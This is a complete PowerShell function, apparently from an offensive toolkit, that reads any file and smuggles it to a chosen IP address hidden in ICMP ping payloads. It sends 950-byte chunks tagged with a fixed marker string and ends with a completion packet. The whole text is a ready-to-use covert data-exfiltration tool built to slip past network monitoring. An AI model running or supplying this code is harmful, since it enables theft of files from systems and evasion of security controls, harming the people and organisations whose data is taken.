function Invoke-IcmpUpload
{
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $IPAddress,
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $file
    )
    
    [Environment]::CurrentDirectory = $pwd
    $bytes = [System.IO.File]::ReadAllBytes($file)
    $fileLength = $bytes.Length
    $bytes = {$bytes}.Invoke()
    $blockSize = 950  # Adjust to fit within ICMP limits with prefix

    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
    $PingOptions.DontFragment = $True
    $prefix = ([text.encoding]::ASCII).GetBytes("I(mP'#v.c5_]p'pt~E{4cg%.1&~=+|")  # Unique prefix

    echo "Sending $file to $IPAddress, please wait..."
    for ($i = 0; $i -lt $fileLength; $i += $blockSize)
    {
        $successful = $false
        while ($successful -eq $false)
        {
            $endval = $i + $blockSize - 1
            if ($i + $blockSize -gt $fileLength)
            {
                $diff = $fileLength - $i
                $endval = $i + $diff - 1
            }
            $sendbytes = $prefix + $bytes[$i..$endval]  # Add prefix to data
            $reply = $ICMPClient.Send($IPAddress, 120, $sendbytes, $PingOptions)
            if ($reply.Status -eq [System.Net.NetworkInformation.IPStatus]::Success)
            {
                $successful = $true
            }
        }
    }
    
    # Send completion message with prefix
    $sendbytes = ([text.encoding]::ASCII).GetBytes("I(mP'#v.c5_]p'pt~E{4cg%.1&~=+|i(mpeXf!1+>c0Mp{e+3d")
    $reply = $ICMPClient.Send($IPAddress, 120, $sendbytes, $PingOptions)
    echo "File transfer complete!"
}
